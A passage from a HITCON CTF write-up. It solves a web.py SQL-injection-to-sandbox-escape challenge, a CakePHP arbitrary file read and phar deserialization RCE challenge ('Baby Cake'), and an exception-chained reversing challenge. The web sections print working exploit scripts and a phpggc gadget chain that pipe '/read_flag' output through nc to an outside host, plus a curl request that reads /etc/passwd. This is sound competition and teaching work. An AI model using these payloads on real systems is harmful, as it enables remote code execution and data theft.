This issue is fixed in webpy 0.39, but the server side still use 0.38! Thus it's vulnerable to SQLite injection through `limit` parameter.

@kaibro found [another issue](https://github.com/webpy/webpy/commit/8fa67f40f212fbfe51aa5493fc377c683eff9925). They try to fix `eval` code execution by passing a empty builtin to it.


```python
def reparam(string_, dictionary): 
    """
    Takes a string and a dictionary and interpolates the string
    using values from the dictionary. Returns an `SQLQuery` for the result.
        >>> reparam("s = $s", dict(s=True))
        <sql: "s = 't'">
        >>> reparam("s IN $s", dict(s=[1, 2]))
        <sql: 's IN (1, 2)'>
    """
    dictionary = dictionary.copy() # eval mucks with it
    # disable builtins to avoid risk for remote code exection.
    dictionary['__builtins__'] = object()
    vals = []
    result = []
    for live, chunk in _interpolate(string_):
        if live:
            v = eval(chunk, dictionary)
            result.append(sqlquote(v))
        else: 
            result.append(chunk)
    return SQLQuery.join(result, '')

```

When `eval` takes the second parameter with builtin in it, the current builtin will be replaced. In the source code the builtins is set to an empty object. In other words, passing builtin is similarly to replace the current namespace.


```python
>>> eval('__builtins__',{'__builtins__': object})
<type 'object'>
>>> dir(eval('__builtins__',{'__builtins__': object}))
['__class__', '__delattr__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
>>> eval('__builtins__')
<module '__builtin__' (built-in)>
>>> dir(eval('__builtins__'))
['ArithmeticError', ... ,'xrange', 'zip']

```

However, replacing the namespace doesn't prevent us to retrieve other exploitable classes. We just cannot directly use eval, `__import__` .... 

First, list all the classes through `[].__class__.__base__.__subclasses__()`:

`db.select('posts', limit="slowpoke ${[].__class__.__base__.__subclasses__()}", order='ups desc')`


```python
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <type 'time.struct_time'>, <type '_thread._localdummy'>, <type 'thread._local'>, <type 'thread.lock'>, <type 'collections.deque'>, <type 'deque_iterator'>, <type 'deque_reverse_iterator'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'itertools.combinations'>, <type 'itertools.combinations_with_replacement'>, <type 'itertools.cycle'>, <type 'itertools.dropwhile'>, <type 'itertools.takewhile'>, <type 'itertools.islice'>, <type 'itertools.starmap'>, <type 'itertools.imap'>, <type 'itertools.chain'>, <type 'itertools.compress'>, <type 'itertools.ifilter'>, <type 'itertools.ifilterfalse'>, <type 'itertools.count'>, <type 'itertools.izip'>, <type 'itertools.izip_longest'>, <type 'itertools.permutations'>, <type 'itertools.product'>, <type 'itertools.repeat'>, <type 'itertools.groupby'>, <type 'itertools.tee_dataobject'>, <type 'itertools.tee'>, <type 'itertools._grouper'>, <class 'threading._Verbose'>, <type 'select.epoll'>, <type 'Struct'>, <type 'cStringIO.StringO'>, <type 'cStringIO.StringI'>, <class 'subprocess.Popen'>, <type 'datetime.date'>, <type 'datetime.timedelta'>, <type 'datetime.time'>, <type 'datetime.tzinfo'>, <class 'string.Template'>, <class 'string.Formatter'>, <type 'functools.partial'>, <type '_ssl._SSLContext'>, <type '_ssl._SSLSocket'>, <class 'socket._closedsocket'>, <type '_socket.socket'>, <type 'method_descriptor'>, <class 'socket._socketobject'>, <class 'socket._fileobject'>, <class 'urlparse.ResultMixin'>, <class 'contextlib.GeneratorContextManager'>, <class 'contextlib.closing'>, <type '_io._IOBase'>, <type '_io.IncrementalNewlineDecoder'>, <type '_hashlib.HASH'>, <type '_random.Random'>, <type 'cPickle.Unpickler'>, <type 'cPickle.Pickler'>, <class 'web.webapi.OK'>, <class 'web.webapi.Created'>, <class 'web.webapi.Accepted'>, <class 'web.webapi.NoContent'>, <class 'web.db.SQLParam'>, <class 'web.db.SQLQuery'>, <type 'bz2.BZ2File'>, <type 'bz2.BZ2Compressor'>, <type 'bz2.BZ2Decompressor'>, <type 'pwd.struct_passwd'>, <type 'grp.struct_group'>, <class 'web.template.SafeVisitor'>, <class 'web.template.TemplateResult'>, <class 'web.form.Form'>, <class 'web.form.Input'>, <class 'web.session.Session'>, <type 'sqlite3.Row'>, <type 'sqlite3.Cursor'>, <type 'sqlite3.Connection'>, <type 'sqlite3Node'>, <type 'sqlite3.Cache'>, <type 'sqlite3.Statement'>, <type 'sqlite3.PrepareProtocol'>]

```

Take a closer look. There is `<class 'subprocess.Popen'>` class, so it's trivial to RCE now!

My payload:

```python
#!/usr/bin/env python3
import requests
from Crypto.Cipher import DES 

def encrypt(s):
    raw = s.encode()
    pad = 8 - len(raw) % 8 
    raw += bytes([pad] * pad)
    print(raw)
    return DES.new('megnnaro').encrypt(raw).hex()

def decrypt(s):
    raw = DES.new('megnnaro').decrypt(bytes.fromhex(s))
    return raw[:-raw[-1]].decode()
# <class 'subprocess.Popen'>
h = encrypt("m=p&l=${[].__class__.__base__.__subclasses__()[-68]('/read_flag | nc 240.240.240.240 5678',shell=1)}")
print(requests.get('http://13.115.255.46/?s=' + h).text)

```

It's worth to mention @qazwsxedcrfvtg14 's more creative payload. I can't believe that an unbounded method can access `__globals__` in Python 2.7 !


```python
([t for t in ().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__).__globals__['__builtins__']['__import__']('os').system('sleep 10')

```

The flag is `hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}`.

### Baby Cake 

The server side is running CakePHP 3.5, which is an outdated version of CakePHP. The hint and challenge description imply that we should get the shell, and it's not related to SSRF.

Here is the code of the main controller. It simply proxies user's request. A cache is also implemented using md5(URL) as key. You can find the complete version of server source code in [author's website](https://github.com/orangetw/My-CTF-Web-Challenges#baby-cake).


```php
<?php

namespace App\Controller;
use Cake\Core\Configure;
use Cake\Http\Client;
use Cake\Http\Exception\ForbiddenException;
use Cake\Http\Exception\NotFoundException;
use Cake\View\Exception\MissingTemplateException;

class DymmyResponse {
    function __construct($headers, $body) {
        $this->headers = $headers;
        $this->body = $body;
    }
}

class PagesController extends AppController {

    private function httpclient($method, $url, $headers, $data) {
        //['get', 'post', 'put', 'delete', 'patch']
        $options = [
            'headers' => $headers,
            'timeout' => 10
        ];

        $http = new Client();
        return $http->$method($url, $data, $options);
    }

    private function back() {
        return $this->render('pages');
    }

    private function _cache_dir($key){
        $ip = $this->request->getEnv('REMOTE_ADDR');
        $index = sprintf('mycache/%s/%s/', $ip, $key);
        return CACHE . $index;
    }

    private function cache_set($key, $response) {
        $cache_dir = $this->_cache_dir($key);
        if ( !file_exists($cache_dir) ) {
            mkdir($cache_dir, 0700, true);
            file_put_contents($cache_dir . "body.cache", $response->body);
            file_put_contents($cache_dir . "headers.cache", serialize($response->headers));
        }
    }

    private function cache_get($key) {
        $cache_dir = $this->_cache_dir($key);
        if (file_exists($cache_dir)) {
            $body   = file_get_contents($cache_dir . "/body.cache");
            $headers = file_get_contents($cache_dir . "/headers.cache");
            
            $body = "<!-- from cache -->\n" . $body;
            $headers = unserialize($headers);
            return new DymmyResponse($headers, $body);
        } else {
            return null;
        }
    }

    public function display(...$path) {    
        $request  = $this->request;
        $data = $request->getQuery('data');
        $url  = $request->getQuery('url');
        if (strlen($url) == 0) 
            return $this->back();

        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );
        if (strlen($scheme) == 0 || !in_array($scheme, ['http', 'https']))
            return $this->back();

        $method = strtolower( $request->getMethod() );
        if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )
            return $this->back();


        $headers = [];
        foreach ($request->getHeaders() as $key => $value) {
            if (in_array( strtolower($key), ['host', 'connection', 'expect', 'content-length'] ))
                continue;
            if (count($value) == 0)
                continue;

            $headers[$key] = $value[0];
        }

        $key = md5($url);
        if ($method == 'get') {
            $response = $this->cache_get($key);
            if (!$response) {
                $response = $this->httpclient($method, $url, $headers, null);
                $this->cache_set($key, $response);                
            }
        } else {
            $response = $this->httpclient($method, $url, $headers, $data);
        }

        foreach ($response->headers as $key => $value) {
            if (strtolower($key) == 'content-type') {
                $this->response->type(array('type' => $value));
                $this->response->type('type');
                continue;
            }
            $this->response->withHeader($key, $value);
        }

        $this->response->body($response->body);
        return $this->response;
    }
}

```


#### Failed Attempts

- headers unsafe unseraialization
    - Actually it comes out to be pretty safe. `$header` is a [2d array](https://github.com/cakephp/cakephp/blob/master/src/Http/Client/Response.php#L204-L227) and it's not fully controllable
- 301/302 edirection to `file://`: 
    - The redirection is not set in the `$options`. Thus it will not follow redirections.
- Exploit rewrite rules to read arbitrary files:
    - However most of the rewrite rule on the server follow [CakePHP official installation guide](https://book.cakephp.org/3.0/en/installation.html#apache). It seems not exploitable.
- Exploit `_mergeOptions` and try to manipulate `$option` for redirection:
    - No, the `$header` is not fully controllable.
- [httpoxy vulnerabilty](https://github.com/cakephp/cakephp/issues/9137) in CakePHP
    - I think we should get the shell.
- Possible scheme override:
    - HTTP Method can be overriden using `X-Http-Method-Override: GET`, but for scheme it's not possible.
- CakePHP 3.5 CVE / Vulnerability:
    - Even though it's possible, I think it's not possible to directly RCE however.
- PHP [exploitable functions](https://stackoverflow.com/a/3697776):
    - There is no system, shell_exec, eval, assert functions in HTTP Client.
- PHP user-defind functions:
    - [call_user_func](https://github.com/cakephp/cakephp/blob/master/src/Http/ServerRequest.php#L838), [dynamic function call](https://github.com/cakephp/cakephp/blob/master/src/Http/Client/Response.php#L563) and [dynamically generated classname](https://github.com/cakephp/cakephp/blob/master/src/Http/Client.php#L610). However they are both not exploitable because there is no invokation of the three functions. The classname one is too difficult to exploit.
- SSRF 169.254.169.254
    - Not much useful information. The hint says "it's not related to SSRF".
- Brute force authour's ssh public key (SSRF 169.254.169.254 metadata)
    - It will be more efficient to hold a gun pointed to the admin's head, my friend.


#### Arbitrary File Read

When browsing the issue of the cakephp github, I came to [this issue](https://github.com/cakephp/cakephp/issues/6540). The cakephp http client bahaves [similarlly to `curl`](https://stackoverflow.com/a/12667839). Both of them use `@` to include local files. It's also [documented on their website](https://book.cakephp.org/3.0/en/core-libraries/httpclient.html#creating-multipart-requests-with-files).

Now we can read arbitrary files on the server. Just send a POST request with the data array. Don't forget the filename should be prepended with `@`.


```shell
curl 'http://13.230.134.135/?url=http://240.240.240.240:3310&data[]=@/etc/passwd' -X POST

```
Let's read some files which may contain some juicy information:

- /etc/apache2/sites-enabled/000-default.conf
- /etc/passwd
- /proc/self/cmdline
- /flag (cannot read)
- /read_flag (because other web challenges use `/read_flag` to read the flag)

Unfortunately none of them is useful. We still need shell.

#### phar unserialization to RCE

Trace [a little deeper](https://github.com/cakephp/cakephp/blob/master/src/Http/Client/FormData.php#L157). The `@`  syntax uses PHP `file_get_contents` API. Therefore we can use PHP wrappers, but it's still not enough for a shell.

Then @Kaibro and @ysc mentioned that it's possible to use `phar://` wrappers to triiger PHP gadget chains. I actually don't know unserilization can be so powerful! In face phar unsafe unserialization is one of [Orange's 2017 HITCON challenges](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017). However when we found this is a promising solution, only 10 minutes left in the competition...... It's pity we don't solve it in the competition.

Anyway, let's leveraging [phpggc](https://github.com/ambionics/phpggc) to create a PHP Gadget Chains (thanks to @ysc). One of the dependency of CakePHP is monolog 1.23. We can use phpggc [Monolog/RCE1](https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/chain.php)! For the deatils of how to create a `phar` file please refer to [here](https://rdot.org/forum/showthread.php?t=4379) and [here](https://delcoding.github.io/2018/09/defcamp-writeup2/).

We modify the `./phpggc/gadgetchains/Monolog/RCE/1/chain.php` to create a phar exploit:


```php
<?php
namespace GadgetChain\Monolog;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '1.18 <= 1.23';
    public $vector = '__destruct';
    public $author = 'cf';

    public function generate(array $parameters)
    {   
        $code = "/read_flag | nc 240.240.240.240 1337";
        $a= new \Monolog\Handler\SyslogUdpHandler(
            new \Monolog\Handler\BufferHandler(
                ['current', 'system'],
                [$code, 'level' => null]
            )
        );
        unlink('/tmp/exp.phar');
        $p = new \Phar('/tmp/exp.phar', 0); 
        $p['file.txt'] = 'test';
        $p->setMetadata($a);
        $p->setStub('<?php __HALT_COMPILER(); ?>');
        return $a; 
    }   
}

```

We'll first make a GET request such that server will save the expolit. Then use POST to trigger the unsafe unserialization. The path of the body.cache is known.


```python
import hashlib
import requests
s = requests.session()
print(s.get('http://13.230.134.135/', params={'url': 'http://240.240.240.240:11111/exp.phar'}).text)
md5 = hashlib.md5(b'http://240.240.240.240:11111/exp.phar').hexdigest()
print(s.post('http://13.230.134.135/', params={'url': 'http://240.240.240.240:11111/exp.phar', 'data[]': '@phar:///var/www/html/tmp/cache/mycache/240.240.240.240/'+md5+'/body.cache'}))

```

The flag is `hitcon{smart_implementation_of_CURLOPT_SAFE_UPLOAD><}`. This is a classic example how an innocuous arbitrary file read vulnerability turns into a RCE.

## Reverse

### EOP

Instead of directly call functions and return, the binary leverages the mechanism of exception in C++ to chain the functions, and the operations of an encryption algorithm scattered into 123 functions.
To speed up the process of reversing, we extract them by idapython.


```python=
from idaapi import *


#rename function pointor in sub_482A
dic = {}
for i in CodeRefsTo(0xacd2, 1):
    dic[GetFunctionName(i)] = GetFunctionName(Qword(GetOperandValue(NextHead(i),1)))
s = 0x4843
e = 0x55A7
while s < e:
     name = dic[GetFunctionName(GetOperandValue(s,0))]
     name = "ptr_" + name
     MakeNameEx(GetOperandValue(NextHead(s),0),name,idc.SN_NOWARN)
     s += 0x5f-0x43

#get the exception number of next function
next = {}
for i in CodeRefsTo(0x4670 ,1):
    if "mov     dword ptr [rax]," in GetDisasm(NextHead(i)):
        next[GetFunctionName(i)] = GetOperandValue(NextHead(i),1)

#the order of function    
next_f = 28
order = []
for i in range(123):
    now_f = Name(0x2131E0 + 8*next_f)[4:]
    order.append(now_f)
    next_f = next[now_f]

#extract code from every function
code = {}
for i in CodeRefsTo(0x04640,1):
    if GetFunctionName(i) in order:
        temp = NextHead(i)
        code_t = []
        while "___cxa_allocate_exception" not in GetDisasm(temp):
            code_t.append(GetDisasm(temp))
            temp = NextHead(temp)
        if code_t[-1] ==  "mov     edi, 4":
            code_t = code_t[:-1]
        code[GetFunctionName(i)] = code_t

#arrange code by order
whole = []
for i in order:
    whole += code[i]

print '\n'.join(whole)

```

Compiling a binary from assembly, which can be analyzed by angr, but it couldn't even get the first 16 byte of  the solution. 
Therefore, I dove into the code and realized that the encryption is reversible.


```python=
import idaapi
import struct


def key(idx):
    return  idaapi.get_many_bytes(Qword(LocByName("code"))+idx*4,4)
    
def xor(str1, str2):
    result = [0]*len(str1)
    for i in range(len(str1)):
        result[i] = chr(ord(str1[i])^ord(str2[i]))
    return ''.join(result)

def ror(s1, shift):
    data = struct.unpack("<I",s1)[0]  
    body = data >> shift
    remains = (data << (32 - shift)) - (body << 32)
    data = (body + remains)
    return struct.pack("<I",data)
    
def rol(s1, shift):
    data = struct.unpack("<I",s1)[0]
    remains = data >> (32- shift)
    body = (data << shift) - (remains << 32 )
    data =(body + remains)
    return struct.pack("<I",data)
    
def add(c, tempa, tempb, t):
    c = struct.unpack("<I",key(c))[0]
    tempa = struct.unpack("<I",tempa)[0]
    tempb = struct.unpack("<I",tempb)[0]
    return struct.pack("<I",(c+tempa+tempb*t)&0xffffffff)



a = idaapi.get_many_bytes(LocByName("check"),0xf0-0xc0)

flag = []
feedback_R = "\00"*8
feedback_L = "\00"*8
for sli in range(0,48,16):
    final_R = a[sli:sli+8]
    final_L = a[sli+8:sli+16]

    #FP
    final_L = xor(final_L[:4], key(6)) + xor(final_L[4:], key(7))
    final_R = xor(final_R[:4], key(4)) + xor(final_R[4:], key(5))
    
    #process
    iv = 39
    for i in range(8):
        temp_A = xor(xor(key(ord(final_R[2])+0x240),key(ord(final_R[1])+0x140)),xor(key(ord(final_R[0])+0x40),key(ord(final_R[3])+0x340)))
        temp_B = xor(xor(key(ord(final_R[5])+0x240),key(ord(final_R[4])+0x140)),xor(key(ord(final_R[7])+0x40),key(ord(final_R[6])+0x340)))
        final_L = final_L[:4] + xor(final_L[4:], add( iv,temp_A, temp_B,2))
        final_L = rol(final_L[:4],1) + ror(final_L[4:],1)
        final_L = xor(final_L[:4], add(iv-1,temp_A, temp_B,1)) + final_L[4:]
        temp_A = xor(xor(key(ord(final_L[2])+0x240),key(ord(final_L[1])+0x140)),xor(key(ord(final_L[0])+0x40),key(ord(final_L[3])+0x340)))
        temp_B = xor(xor(key(ord(final_L[5])+0x240),key(ord(final_L[4])+0x140)),xor(key(ord(final_L[7])+0x40),key(ord(final_L[6])+0x340)))
        final_R = final_R[:4] + xor(final_R[4:], add(iv-2,temp_A, temp_B,2))
        final_R = rol(final_R[:4],1) + ror(final_R[4:],1)
        final_R = xor(final_R[:4], add(iv-3,temp_A, temp_B,1)) + final_R[4:]
        iv = iv - 4
    #IP
    final_L = xor(final_L[:4], key(0)) + xor(final_L[4:], key(1))
    final_R = xor(final_R[:4], key(2)) + xor(final_R[4:], key(3))
    
    flag.append(xor(final_L,feedback_L))
    flag.append(xor(final_R,feedback_R))
    feedback_R = a[sli+8:sli+16]
    feedback_L = a[sli:sli+8]

print ''.join(flag)

```

solution is `~Exc3p7i0n-Ori3n7ed-Pr0grammin9~RoO0cks!!\o^_^o/`
